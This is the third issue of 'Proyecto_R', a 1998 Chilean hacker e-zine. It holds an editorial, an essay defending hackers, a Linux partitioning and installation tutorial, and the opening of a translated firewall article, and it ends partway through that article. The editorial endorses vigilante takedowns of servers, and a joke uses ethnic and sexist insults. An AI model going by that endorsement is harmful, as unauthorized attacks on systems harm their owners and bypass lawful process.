                   ....                 
                .oH*RR$Wx.              
               x*#"~```"!Rn             
              z!~        ~@!            
             xZ~+osem+e.  `Mi         ¡¡BIENVENIDOS -- BIENVENIDOS!!
             $? 'M$$~4$$L  `$:          
            dR   WTQ  Q$$   !W       ~ AL PRIMER MAGAZINE ELECTRONICO ~         
            *!   RN$  $$*   `R                  <<CHILENO>>
            !   !@$ .R$!    !k              PARA HISPANOAMERICA
           '$    $$$oW@#     @k         
           '$    $TR?$$      @F      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~      
           'R    $WR4$$L     $!      Õ                                Õ
            $L   $$R RTN    :$~      Õ       >>>-PROYECTO_R-->        Õ
            ?B   $$R `M$:   X$       Õ                                Õ
            `$:  $EN  M$W: .*F       Õ  "La copia infeliz del Eden"   Õ
             !$.+***@.`*!R.!H        Õ   @@@@@@@@@@@@@@@@@@@@@@@@@    Õ
             `?NL      ```W@"        Õ                                Õ
              `#$m.    .u@#~         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                ~H#tWXW$*"`             
                 ``"""""

                                  NUMERO "3"

                             21 Septiembre de 1998
		   Junto a Nuestra Primavera nace un nuevo fenomeno

                                                              
                Url      : http://prm.home.ml.org
                           http://www.bigfoot.com/~proyecto_r
                     	   http://www.geocities.com/colosseum/sideline/9497

		E-Mail	 : proyecto_r@bigfoot.com 

     
     Staff Extraoficial (o hasta el momento somos!)
     
     ==TAkER==
     ==AnDyK==
     ==Mate Swichman==
     ==PlaXiuS==
	
    Colaboradores de este Numero :

     Joel McNamara
     Arturo Quirantes Sierra
     Francisco Cruz Argudo
     Conde Vampiro  
     



  SOPORTE 911 
 
  Secretaria  : Alo soporte .
  Computin    : Si digame , en que puedo servirle (pa' variar simpre eficiente).
  Secretaria  : Sabe que  , mm es que mmmm tengo un problemita .
  Computin    : Cuentame !!!
  Secretaria  : Es el Fax .
  Computin    : Que pasa con el Fax , no me corresponden esos problemas pero bueno .
  Secretaria  : Es que mi jefe me pidio mandar un documento .
  Computin    : Ya ok y cual es el problema .
  Secretaria  : ES QUE LLEVO MAS DE DOS HORAS ENVIANDO EL DOCUMENTO Y TODAVIA NO SE VA !!!
                TODAVIA LO TENGO EN MIS MANOS .. HABRA MUCHO TRAFICO O NO CABRA EN LA
                LINEA TELEFONICA ... TRATE DE MANDARLO ENROLLADITO Y TAMPOCO FUNCIONO .
                Alo .. Aloo responda pues !!!
  Computin    : Tuu Tuuu Tuuu ... (Plop) .

  Soporte 911 esta dedicado a la ignorancia de la gente !!! Deja de ser un maldito sudaka
  subdesarrolado , lee , estudia , instruyete ... . Dedicado a todas las secretarias tontas .
  (notese solo a las tontas)



    

################################# INDICE ###################################
#                                                                          #
#  1 Editorial .........................................Editor             #
#  2 Desconocimiento Total o Puro Sensacionalismo.......Conde Vampiro      #
#  3 Algunas cosillas sobre Firewalls...................TAkER              #
#  4 Conviviendo con Linux..............................PlaXiuS            #
#  5 Ataques practicos contra PGP ......................Arturo Quirantes   #
#  6 Chistes , Cuentos y otras Burradas.................VaRioS             #
#  7 Algo sobre Seguridad de Redes .....................Francisco Cruz     #
#  8 Curso de ASM ......................................AnDyK              #
#  9 Jugando con Novell 3.11 vol 0,5....................TAkER              #
# 10 BackDoorS (NewS) ..................................Mate Switchman     #       
# 11 Ha llegado Mail ...................................VaRioS		   #    
# 12 Shutdown ..........................................Proyecto_R         #
# 13 Llaves PGP ........................................Proyecto_R         #
#												   #
############################################################################


=============================================================================


                             ~~~~~~~~~~~~~~~~~
                             #               #
                             # 1.- EDITORIAL #
                             #               #
                             ~~~~~~~~~~~~~~~~~

__________________________________________________________________ By Editor


Hola Terricolas :

Bueno hemos llegado a nuestro tercer numero .. !! Guauu es increible , 
aunque muchos no daban ni un 20 por nosotros , hemos seguido trabajando
duro por este poryecto y aunque aun somos poquitos , y todavia nos hace
falta colaboracion , seguiremos trabajando duro para crecer mas y ser 
mejores . Entregar mas informacion a nuestros lectores y de la misma 
forma ir aprendiendo al informar .
Nuestro sitio web ha tenido gran cantidad de publico , hasta el momento
un promedio de 5 personas al dia , nada de mal para estar empezando creo
yo , muchos visitantes chilenos nos acompañan ; cosa que nos alegra
bastante ya que al principio encontramos un poco frio el recibimiento 
nacional ... teniamos mas visitas de España y Mexico , que de nuestro 
propio país ... ;(( Pero ya es una etapa superada .. queremos saludar
tambien a todos nuestrso amigo hispanoamericanos que nos leen ,de Mexico
, España , Colombia , Argentina eTc... gracias a vustras visitas y sus
mails , nos dan ganas de trabajar mas duro aun .!!
Como ya hemos informado en nustra pagian web , pronto daremos informacion
sobre el "Komando API" que se encargara de luchar en contra de la 
pornografia infantil en la RED , usaremos mano dura con ellos hee !!! 
espero que colaboren todos .- de alguna u otra forma . Siempre habra
alguna forma de eliminar servidores que contengan este tipo de 
material  .
Queremos que nuestros lectores nos informen sobre grupos hacks que existan
o se esten formando en latinoamerica a ver si podemos servirles como medio
de contacto hehe!!! sin paranoia , que existen los remailers y el PGP .. ahh
verdad eso queria decirles vamos a publicar en esta edicion la llave PGP del
E-Zine que sera la misma llave PGP de editor de turno ... digo editor de turno
por si algun dia no pueda seguir con el proyecto o deba desaparecer 
misteriosamente , por si quieres escribirnos algo un poco delicado .. haaa y 
hablando de PGP en este numero un sorprendente numero de Ataques Practicos 
al PGP , creias que tu PGP era seguro ??? veremos que dices al terminar de leer 
el articulo .. tenemos varios proyectos .. como lo hes la distribucion de CD
de Linux gratis , para las personas que habitan en Chile !!!! a ver si a 
futuro hacemos buenos contactos en otros paises para expandir la distribucion
, aunque la verdad no veo para que seria mas facil bajarlo de la inet ..
Pero Bueno .... No se abran dado cuenta en el numero dos aparecio una 
nueva seccion llamada BacKDoorS , que sera nuestra seccion de noticias .
Creo que este numero ha sido el mejor que hemos sacado .. bueno de los 
poquitos numeros que tenemos jejej , pero se ve que esta cosa suma y sigue ,
y tiene para rato .... Asi que continuaremos con nuestro esfuerzo .. y les
aseguro que daremos que hablar en la esena UNDER .

Proyecto_R se hace participe en la luchas que mantienen en este momento
las etnias indigenas de america .... no dejaremos que los gobiernos y los
TODOPODEROSOS aplasten al pueblo indigena . Lo sentimos bastante por 
la Prole mexicana que bastante ha sufrido con la represion del gobierno
federal y nos hacemos parte de su dolor . Al pueblo mapuche le prestamos
todo nuestro apoyo , no dejaremos que una maldita empresa los pisotee y 
pasen a llevar sus raices ... estaremos con ustedes hasta en las ultimas 
consecuencias , y si la situacion se saliera de control ...
ACTUAREMOS CON TODAS NUESTRAS FUERZAS !!! Que nuestros lectores no piensen
que somos aliados politicos , que somos comunistas o cosas por el estilo ,
de hecho no simpatizamos con ningun partido politico ya que son todos unos
CERDOS MENTIROSOS , que del unico bien del cual se preocupan es el de ellos .
Solo nos identificamos con lo que creemos JUSTO !!


Bueno no los aburro mas con el bla bla ... y vamos a la ACCION !!!!




PlaXiuS
El Editor 
 
ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ


		   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		   #								       #	
               #¨2.-DESCONOCIMIENTO TOTAL O PURO SENSACIONALISMO ? #
 		   #	                                                 #
               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

____________________________________________________________ By Conde Vampiro



        En primer lugar saludar a todos los lectores de este nuevo ezine, el
  cual les deseo la mejor suerte y que no se rindan, ya que la creacion de un
  ezine es de todo menos facil.

        Este articulo es una simple opinion referente al mundo de los hackers
  y demas historias. Como sabemos siempre que un intruso a sido detenido al
  entrar en un sistema informatico ajeno, los medios de prensa ya le ponen el
  calificativo de hacker, sin saber ni siquiera si este era un ni¤o jugando,
  un empleado descontento, etc. Esto logicamente es totalmente erroneo y
  provoca la confusion entre la gente. Esto por desgracia este llegando a unos
  niveles increibles, por ejemplo, conozco gente que esta estudiando la
  carrera de ingenieria informatica pero que los temas de los hackers no les
  interesa pero cuando hablan sobre esto lo unico que saben decir es que los
  hackers son malos, ya que lo unico que leen sobre los hackers es en los
  medios de comunicacion.

        Por lo visto poco importa que grupos tan prestigiosos como LOpth,
  Boston, EE.UU., hace unas semanas fuese invitado al congreso de los EE.UU.
  para mostrar a los senadores como estan las cosas en Internet, logicamente,
  enfocandose en la seguridad. Mostraron de como un autentico pirata
  informatico con el conocimiento y la habilidad necesaria puede neutralizar
  la red Internet en poco tiempo. Al igual como otro grupo muy famoso como es
  el CCC (Chaos Computer Club), Hamburgo, Alemania, demostro delante de las
  camaras a nivel nacional de como una tecnologia de la conocida empresa
  Microsoft podria ser usada para robar informacion o alterar el ordenador
  de una persona remotamente para un beneficio propio.

        Muchos de la famosos expertos en seguridad, cuando eran jovenes
  practicaban el hacking, ya que es uno de los periodos en cualquier experto
  en seguridad. Pero a estos famosos nunca vemos como la prensa los machaca o
  ni siquiera hablan mal de ellos. Es bien sabido que muchas empresas
  contratan hackers para proteger sus sistemas informaticos, entonces, ¨ si
  los hackers son malos porque las empresas los contratan, acaso estan
  locos. ? No lo creo.

        Por eso no ahi nada malo en ser un hacker, refiriendome a una persona
  que investiga, mejora las cosas, comparte sus descubrimientos y sobre todo
  mejora la calidad de la informatica, en ningun caso un hacker es "aquella
  persona que es capaz" de conectar a cualquier pagina web, bajarse
  determinados programas y usuarlos para entrar en un servidor ajeno. ¨ Me
  pregunto cuantos de estos supuestos hackers saben algo util en realidad. ?

        Por supuesto no espero que todo el mundo piense igual que yo, incluso
  habra gente que dira que solo estoy diciendo tonterias y puede que lo sea,
  pero es la forma de como yo lo veo y es una opinion mas. Por algo pedimos
  libertad de expresion. No intento herir la sensibilidad de nadie, como ya
  he dicho es mi opinion sencillamente.
  
  Byes all y hasta la vista !!
    
                                                        CONDE VAMPIRO
                                                  - J.J.F. / HACKERS TEAM -



ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ   


                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                          #                          #
                          #    3.-Mi pc y Linux      #
                          #         PARTE 1)         #
				  #				     #	
                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~

__________________________________________________________________ By PlaXiuS


Mucho se ha hablado de este sistema operativo , que realmente vale la pena 
tener.  El problema de Linux es que aun no tiene el apoyo de las desarrolladoras
de software , pero poco a poco , algunas compañias se estan uniendo a este 
marvilloso y poderoso sistema operativo . Corel ya ha sacado varios de sus 
programas diseñados para paltaforma Linux y esperamos que otros sigan su 
ejemplo . Pero cada dia mas personas instalan linux en su pc , por razones 
evidente (ya estan aburridos de que se les cuelgue la maquina o que con cada
parche o actualizacion de software , el pc se ponga mas lento ).

Un poco de Historia :

Bueno , se sabe que UNIX es un sistema operativo bastante potente que soporta
multitarea y tiene una cantidad de opciones increibles .... El gran problema de
UNIX es que es demasiado caro ,y no esta al alcanze de la mayoria de los mortales
, es asi como grupos de hackers Unix , y expertos en programacion se lanzan en la 
aventura de crear un nuevo sistema operativo que se asimilara a UNIX , pero que
a diferencia de este no costara ni un duro !!! es asi como Andy Tanenbaum crea
el Minix ; que era un version mas pequeña de UNIX ... Alguien dijo Minilinux !!!
si algo asi .. hee - Fue asi como inspirado en MINIX , Linus Trobalds de la 
universidad de Helsinki , Finlandia , diseño y creo un nuevo sistema operativo
mas potente que MINIX , al cual le llamo "LINUX" una fusion entre el nombre de este
y unix ...
Asi empezo esta aventura a la cual se fueron uniendo mas colaboradores hasta 
llegar al nivel actual donde linux es un sistema operativo bastante conocido
y bastante elogiado por los entendidos .... La gracias de linux es que al ser
sus propios usuarios los que ayudan a desarrollarlo y al ser un opens system ..
es decir " que el codigo fuente esta ahi para que tu lo modifiques a tu antojo"
es que linux es mejor soportado y mejor aun mas potenete y eficiente ... hasta
el dia de hoy si quieres hacerte participe de este proyecto ... mas bien dicho
si quieres participar en el mejoramiento y actualizacion del nucleo lo puedes
hacer a travez de Linus T. quien es el encargado de recibir todas las mejoras ,
evaluarlas y actualizar el nucleo ...
Linux es un sistema de libre distribucion , es decir que puedes bajartelo , 
copiarlo , etc... todo gratis .... Si compras una distribucion de linux en 
CD no tienes ninguna prohibicion de copiar el software cuantas veces quieras
, Ademas la gran mayoria de los programas desarrollados para Linux tambien
son free o mas bien dicho bajo las reglas GNU del la Free Software Fundation.

Bueno ya te has decidido por fin a instalarte linux ... bueno entonces que 
esperamos .
Epezemos por la instalacion de este sistema operativo . 

1) Preparando el Disco Duro .
-----------------------------

Si vas a instalar linux en tu pc , tienes que tener en cuenta que necesitas
250 mb para la instalacion de linux y alrededor de 50 mb para la aparticion 
Swap . (Nota: necesidades de instalacion para usuarios basicos)

Mucha gente tiene solo un disco duro y querra instalar Linux junto a su DOS
o Win95 . Para esas personas Existe un programita llamado FIPS , que se 
encargara de liberar espacio para crear las particiones nativas de LInux y la
particion Swap , sin dañar la particion de Dos .


Pasos a Seguir .

1.- Copy FIPS.EXE al directorip c:\windows c:\dos .
2.- Crear un disco con sistema (DOS o WIN95) y copiar ahi , el archivo 
    RESTORRB.EXE que se encuentra en el mismo directorio de donde sacaste 
    FIPS.EXE (ya sea cd o disco duro ) .
3.- Corre el scandisk y despues el Defrag en tu disco duro , ya que en el
    espacio que se libere en esta operacion , fips creara la nueva particion .
4.- Reinicie el equipo en Modo DOS , (no una ventana DOS) .-
5.- Ejecute FIPS.EXE ahi te aparecera un mensaje , preguntandote cual disco
    quieres particionar ... si tienes uno solo .. sera uno jejeje.-
6.- Al confirmar el proceso de preguntara si quieres hacer una copia de la
    particion actual de tu equipo (por si te lo hechas), colocas el diskette
    booteable en el cual copiaste el RESTORRB.EXE y le dices que si (YES) .
7.- Fips ahora mostrara una tabla de particiones , y creara una nueva
    dependiendo del espacio libre en el disco . Puedes ajustar el espacio 
    usando las flechas de tu teclado . Al darle enter te preguntara si el
    espacio usado en la nueva particion son correctos presione "c" continue ,
    de lo contrario presione "r" de Re-edit .
8.- Ahora fips estara escribiendo la nueva tabla .
9.- Cuando fips termine .. reinicia tu maquina .
10.-Ahora con el Fdisk debes borrar la segunda particion . Linux Fdisk se 
    encargara mas tarde de crear la Particion nativa y la Swap .


 
2) Preparando Boot y Root
-------------------------

Redhat es una de las distribuciones de Linux mas usadas , por su facil manejo
e instalcion . Para instalar REDHAT en nuestro pc lo primero que tenemos que 
hacer es crear un disco llamado Boot .
Vamos a la practica ... suponiendo que tienes un cd (unidad D:) con Redhat 
haremos lo siguiente :

Lo primero que tenemos que hacer es copiar un programita llamado rawrite.exe
desde el CD , normalmente esta en un subdirectorio llamado utils ..

d:\utils>copy rawrite.exe c:\windows

Lo copiamos a windows por lo del path .. pero puede ser cualquier directorio ejm
c:\dos   c:\windows\command

Ahora creamos el BooT .-

C:\>d:
D:\>cd images
D:\>images rawrite
Enter disk images source file name : boot.img 
Enter target diskette drive : a:
Please insert formatted disk into drive A: and press -Enter-:

En el ejmplo anterior al escribir el comando rawrite , el programa nos 
pregunta el nombre de de la imagen que queremos copiar en el diskette , en
este caso el disco BOOT = boot.img .

Si estas instalando tu redhat desde un disco duro , tendras que hacer el 
siguienente paso :

C:\>d:
D:\>cd images
D:\>imagesrawrite
Enter disk images source file name : supp.img 
Enter target diskette drive : a:
Please insert formatted disk into drive A: and press -Enter-:

Lo que acabamos de realizar es el diskette suplementario para cargar el 
Redhat desde una unidad de disco fijo , laptops que requieren soporte para 
PCMCIA , etc....


Slackware es una distribucion de Linux bastante conocida (diria que junto a
RedHat son las mas conocidas y mas usadas) y aunque su instalacion no es tan 
simple y automatizada como la de RedHat , sigue sindo una forma facil y amistosa
de instalar este fabulosos sistema operativo .

Para esta distribucion de Linux necesitamos dos discos .... un disco Boot y otro
llamado Root .

Vamos por el disco BOOT.

Para realizar este diskette hay varias opciones de como hacerlo o mas bien dicho
varias configuraciones, trataremos de describir algunas configuraciones para 
distribuciones mas antiguas por si a alguien le sirve . Los archivos de encuentran
en el siguiente orden ... 
Para bootear desde discos de 1.44 tendremos que buscar nuestros archivos en el 
directorio D:\bootdsks.144 y para discos de 1.2 (a caso todavia existen) en el 
directorio D:\bootdsks.122 , Aun no existe el bootdisk para minidisk :)) jajaja .
Ahora lo que realmente no se .. pero creo haber visto algo en el redhat5.1 es
un autoboot pero , no lo he probado ya que no pude bajar la version completa !!!
si sabes algo ya sabes cuentanos !!!! PREGUNTA PARA NUESTROS LECTORES !!! 
existira alguna version de linux que sea capaz de bootearse desde el CD , algo 
parecido a lo que hace er Guindoze NT ... !!!! mmmm TAkER tenemos mas trabajo 
a averiguar merda !!!!
Bueno despues de esta voladita jeje es que cuando me entretengo en algo no paro
y me dan cuerda .. Es que me apasiona la informatica .. vieran ustedes cuando estoy
haciendo clases ... termino hablando de cualquier cosa menos del tema de la clase :)

Bueno describamos un poquito !!!

las siguientes imagenes pueden venir con extension GZ ..gzip o con extension 1 de
imagen listos para el rawrite ..


Veamos un listadito para una distribucion antigua
**************************************************


bare : Para la instalacion desde disquetes , solo con drivers para discos duros ,
       no soporta SCSI , ni redes .

cdu31a : SOn para aquellos que instalaran el slack desde CD de sony , en concreto

cdu31=(cdu31,cdu33) y para cdu535 .

Idecd : Para lectores de CD IDE... no sera medio obvio .

Mitsumi : Para lectores de 2X Mitsumi ..(el que tengo en la casa jaja no me alcanza
para mas y mas encima lo tengo malo ... bueno la controladora esta mala )

Net : Para instalar Linux a travez de la red TCP/IP ... especial para cargas masivas ..
      (abra algun soporte IPX ??)
Sbpcd : Soporte para CD de soundblaster ... PANASONIC o Panasonic solo !!

Scsi : Soporte para discos y cd SCSI.

SCSINET : Para discos SCSI y red al mismo tiempo !!!!


Medio engorroso heee !!!! pero bueno como hay genios informaticos con conciencia
colectiva que realmente nos solucionan y nos hacen mas facil la vida ( y por amor 
al arte) , en las nuevas versiones de Slackware existen nuevos diskettes de boot ..

VEamos las versiones mas nuevecitas
***********************************

Bare.i : Soporta discos IDE soporta CD ATAPI/IDE  , procporciona soporte PPP  .

Net.i : Adivina buen adivinador ... para redes pues  Ethernet ,!!!

SCSI.i : PAra elememntos SCSI .

SCSINET.i : PAra drivers SCSI y red ethernet

hay varios mas pero los dejaremos para que los estudies tu mismo  ..!!! normalente
si estas instalando desde un CD ide utilizaras eL bare.i


Vamos entonces a crear nuestro disco de BOOT .

D:\>cd bootdsks.144
D:\bootdsks>rawrite
Enter disk image source file name : bare.i
Enter target diskette driver : a:
Please insert a formatted disk into dirver A: and press -Enter-:


Ok estamos listo con el Boot .. ahora nos falta el dico de Root .

D:\>cd rootdsks
D:\ROOTDSKS>rawrite
Enter disk image source file name : color.gz -> en algunas versiones 
puede ser color144.gz etc..
Enter target diskette driver: a:
Please insert a formatted disk into driver A: and press -Enter-:

y listo tenemos nuestro disko de Boot y Root listoko .. !!!!!

Vamos ahora al ataque ... insertemos el disco de Boot y reiniciemos 
nuestra maquina .



3)Comienza el Show ... Donde estan los payasos .. !!!

El redhat tiene la gracia de ser casi completamente automatizado .... dentro
de lo que se puede !!! de hecho como ya lo he mensionado antes es el mas facil
de instalar ... es el a prueba de tontos .. de los linux !!! no se sientan 
ofendidos .. ya que al principio fue la unica distribucion que logre instalar  ,
y eso que no me meti con el debian .,,,,, pero en principio no existian tantas 
guias en español .. ni faqs en este idioma .. hoy gracias .. a la gente del 
proyecto lucas .. y otros tantos .. como los grupos de usuarios de Linux de
Argentina , Uruguay y Mexico que se han dado el trabajo de traducir tremendas
guias y howto de Linux !!!!

Bueno el redhat ba a correr solo un setup y lo primero que te preguntara sera
el tipo de monitor si es color o en blanco y negro . !!ahi eliges tu opcion
y comienza la instalcion .. te preguntara desde donde instalaras el software
y te mostrara varas opciones como .. desde CD  , desde disco duro , o desde
NFS (red) .... En este caso vamos a instalarlo desde el cd .. que detectara 
solito hee mira que inteligente .. heee nos falta poco para el PLUG AnD FUCK ..
perdon para el plug and play ...( conectar y jugar o usar como prefieras .. 
a caso no es lo mismo ) pero si llegaras querer instalar desde el un disco duro
te pedira el disco suplementario .. que tambien sirve para unidades PCMCIA ..
(especial para cargar en nuestro laptop ..) una vez cargado .. te prguntara en 
que unidad de disco quieres instalarlo ... la unidades pueden ser las siguientes :


/dev/hda1      para nuestro primer disco IDE .. normalmente el C:
ahora si tenemos una particion extra en este mismo disco duro .. o la creamos con
el fips .. esta unidad se llamaria ..
/dev/hda2


veamos una tablita para que la entiendan mejor !!!


/dev/hda       Primer disco IDE
/dev/hdb       Segundo disco IDE
/dev/hdc       Tercer disco IDE


Seleccionaremos en este caso el disco /dev/hda que correspondera al nuestro disco
c: .. no vamos a matar er Guindoze que mi señora me mata ... para eso sirve le FIPS
o no  !!!

pero antes de instalarlo tenemos que darle el formato .. o mas bien dicho crearle
la particion adecuada para que linux corra !!!!


para eso seleccionamos la particion y seleccionamos la opcion edit que aparece en el 
cuadro ..

aparecera el siguiente cuadro tipo dos ..

Command (m for help):m

Command action
a toggle a bootable flag
d delete a partition
l list known partition types
m print this menu
n add a new partition
p print partition table
q quit without saving changes
t change a patition`s system id
u change display/entry units
v verify the partiton table
w write table to disk and exit
x extra functionality (experts only)




estamos ejecutando el fdisk para linux !!! ....pero vamos a ver que tenemos 
en el disco .!!


command (m for help):p

Disk /dev/hda:32heads,63 sectors ,1024 cylinders
units = Cylinders of 1024 * 512 bytes

Device     Boot     Begin    Start    End   Blocks   Id   System
/dev/hda    *         1        1       49   100160   06   Dos 16-bit >=32M


"Con el comando P , lo que hacemos es imprimir la configuracion en pantalla
P de Print " (no sera mucho lucho).
Bueno crearemos entonces una nueva particion , que correspondera a la particion
swap ...


Command (m for help):n

Command action
	e extended
	p primary
p <----------------------------le decimos que es una particion primaria
Partition number(1-4):2 <------le decimos la numero 2 ya que la uno ya esta ocupada (DOS).
First cylinder(50-1024):50 <----Obvio le decimos que parta desde el cilindro 50 .
Lasr cylinder or +sizr or +sizeM or +sizeK(54-1024):+16M <--Bueno le decimos en este caso que
                                                            ocupe 16 MB de espacio ..
Podrian haber puesto en vez de +16M , +1600K o el numero del ultimo cilindro .. pero sin el signo
(+) .

Ahora crearemos la particion Nativa de Linux ... nuevamente ocupamos el comando n  .


Command (m for help):n

Command action
	e extended
	p primary
p 
Partition number(1-4):3 
First cylinder(54-1024):54 
Lasr cylinder or +sizr or +sizeM or +sizeK(54-1024):1024 <--en este caso le 
ponemos el ultimo cilindro para no perder nada !!!

Bueno veamos como esta nuestra tabla de partciones ,, !!!!

Command (m for help):p

Disk /dev/hda:32heads,63 sectors ,1024 cylinders
units = Cylinders of 1024 * 512 bytes

Device     Boot     Begin    Start    End   Blocks   Id   System
/dev/hda1    *         1        1       49   100160   06   Dos 16-bit >=32M
/dev/hda2    *         50       50      54   16016    83   Linux Native
/dev/hda3    *         54       54      1024 260160   83   Linux Native

Esta todo bien hasta el momento .. pero tenemos dos particiones nativas de linux ..
y necesitamos una SWAP ... bueno a eso vamos .


Command (m for help):t      <--- para cambiar el tipo de particion
Partition number(1-4):2     <--- la particion que queremos cambiar .
Hex code(type L to list codes)82  <---- el tipo de particion que queremos dejar

Bueno al apretar la L nos lista los tipos de particiones que existen .. la particion
Swap corresponde a la id 82  .
Entonces nuestra tabla de particiones deberia quedar asi !!!

Command (m for help):p

Disk /dev/hda:32heads,63 sectors ,1024 cylinders
units = Cylinders of 1024 * 512 bytes

Device     Boot     Begin    Start     End    Blocks   Id   System
/dev/hda1    *         1        1       49    100160   06   Dos 16-bit >=32M
/dev/hda2    *         50       50      54    16016    82   Linux Swap
/dev/hda3    *         54       54      1024  260160   83   Linux Native

presionamos entonces la W para escribir los cambio y salir del fdisk .

Command (m for help):w

Entonces la instalcion de redhat nos vuelva al menu de instalacion y elegimos
la particion nativa de linux en este caso  /dev/hda3 para instalar ahi el 
sistema . 

Luego nos preguntara si queremos formatear la particion Swap , por supuesto
le decimos que si ...

Ahora solo sigamos las instrucciones .. que ya lo mas complicado esta listo
el resto dependera del tipo de configuracion que quieras instalar ...
por ejemplo te consultara si quieres ver una particion DOS , montada directamente
en el Linux .. si tener que montarla o desmontarla manualmente en el directorio
/mnt ... . Te preguntara que paquetes de software quieres instalar , y que tipo
de arranque quieres ... LILO .. puedes bootear linux desde un disco de arranque 
o si tienes una particion DOS como es este el caso solo debes elegir dentro del 
menu de instalacion LILO la particion de arranque en este caso la /dev/hda1


4)El instalar Slackware es bastante parecido aunque cambia lagunas cositas ...

Para comenzar nuestra instalacion debemos bootear con el disco boot que hemos
hecho previamente ... en algun momento nos preguntara o mas bien dicho nos 
pedira el diskette de root .. que hemos creado dependiendo de nuestras necesidades
, si recuerdan anteriormente creamos la imagen del bare.i que se adecua a las necesidades
tipicas -.-- disco ide , CD atapi/ide , etc..
instalamos el disco  i en algun momento nos mostrara el siguiente promt ..


#  

Bueno ahora tenemos que ejecutar el Fdisk ...

#fdisk
#Command (m for help): 

RECUERDAN ESTE MENU , bueno ahora tenemos que crear la particion swap y la particion
nativa de LINUX donde instalaremos nuestro sistema .....
A todo esto he hablado mucho de la particion SWAP de Linux y no he explicado para que
sirve ..:)) sorry !!!jejej .. bueno la particion Swap nos servira como memoria virtual
en Linux ... les suena algo asi como a archivo de intercambio .. de guindoze !!! bueno
es algo parecido .. pero esta particion si funciona .. y cuando cambiemos o actualizemos
el nucleo de linux ...!! no nos dara errores con el archivo de intercambio . perdoonn con
la particion SWAP !!! jejeje .
 Bueno una vez creada la particion Swap y nativa de linux ,,!!! empezamos la instalacion ..
para esto solo ponemos 

#setup 

Bueno el resto de la instalacion es bastante simple y autoexplicativas .. asi que solo 
tienes que configurarlas segun tus necesidades . !!!
 Bueno ya tenemos instalado Linux ... ahora solo tienes que investigar un poquito bajarte
algunas guias .... etc...

Para el proximo numero hablaremos de los primeros pasos dentro de este sistema operativo.
como crear directorios .. copiar etc.. cosas basicas .. ademas de una introduccion a 
XWindows .. y de algunas configuraciones basicas como Slip .. para tu modem , y 
configuraciones de perifericos en gral .

Bueno hasta la proxima ..

PlaXiuS

ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ


                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                       #                                     #
                       # 4.-Algunas cosillas sobre Firewalls #
   			     #   					       #
                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

_______________________________________________________________________ By TAkER

Una pesima traduccion de un documento que me llego via e-mail (Gracias PlaXiuS), el 
documento original fue escrito por Marcus J. Ranum.

Abstraccion

	Generalmente, a aquel que ocupa el campo de battala primero y espera a su 
enemigo las cosas le resultan mas faciles - Sun Tzu

	Muchas compañias se conectan a Internet protegidas por Firewalls diseñanadas para 
prevenir el acceso no autorizado a sus redes privadas. Ademas de esta meta general, los 
firewalls dan un espacio continuo entre su facilidad de uso y la seguridad. Este documento 
describe algunas de las consideraciones y acciones que hay que tener en cuenta. Se ofrece 
un vocabulario acerca de los firewalls y sus componentes, para asi proveer un buen tema de 
discusion.

POR QUE UN FIREWALL?
	Contra aquellos expertos en el ataque, un enemigo no sabe como defenderse, contra 
los expertos en defensa, el enemigo no sabe como atacar - Sun Tzu

	La razon fundamental para instalar un firewall es casi siempre proteger una red 
privada contra los intrusos. En la mayoria de los casos, el proposito de los firewalls es 
prevenir el acceso no autorizado a los recursos computacionales en una red privada, y a 
menudo para prevenir la exportacion de informacion. En algunos casos la exportacion de 
Informacion no se considera como algo importante, pero para muchas empresas que estan 
conectadas esta es una de las razones que mas les preocupa. Muchas Organizaciones tratan 
de evitar el problema no conectandose a internet (como si esto fuera una solucion). Esta 
solucion puede ser dificil de implementar. Si la red privada es pobremente administrada o 
descentralizada, una sola dependencia de la empresa con un modem de alta velocidad puede 
efectuar una coneccion SLIP con Internet la cual puede comprometer la seguridad de toda la 
red.

	Frecuentemente es seguro decir que el firewall necesita ser colocado en el lugar 
para el factor "CYA" ("Cover Your Assets" o en spanish "Cuida tu patrimonio"). Sin embargo, 
un empleado puede comprometer la informacion guardandola en DAT's o disquettes y llevandola 
fuera de la empresa, El internetrepresenta una amenaza tangible, poblada con peligrosos 
"Vandalos" (es esi como nos llama..???, y encima dice: "Los vandalos fueron un grupo de 
tribus de rudos barbaros que saquearon Roma en 455 y se llevaron todo lo que podian 
cargar.  Algunos usan el termino "hackers" para describirlos, pero seria mejor el de 
VANDALOS, CRACKERS, JERKS, huyyyyy creo que se paso este señor..!!!!), Seria muy facil 
para un administrador de redes perder su trabajo si ocurre una incursion de este caso, 
igual si la infiltracion se dio a traves de una conexion por linea telefonica o por un 
empleado descontento. Generalmente para un sitio Internet, las dificultades tecnicas para 
la implementacion de firewalls son sobredimensionadas por el problema de vender la idea a 
las gerencias de alto grado.


DECISIONES DE DISEÑO
	Examine su ambiente - Mitamoto Musashi

	En la configuracion de un firewall, las desiciones de diseño son mayores en cuanto 
a lo que se refiere la seguridad ya que estas ya han sido dictadas por la empresa o por la 
politica organizacional; especificamente, una decision debe ser tomada teniendo en cuenta 
que la seguridad es mas importante que la facilidad de uso, o viceversa. Aqui hay dos 
planteamientos basicos que generalizan el conflicto:

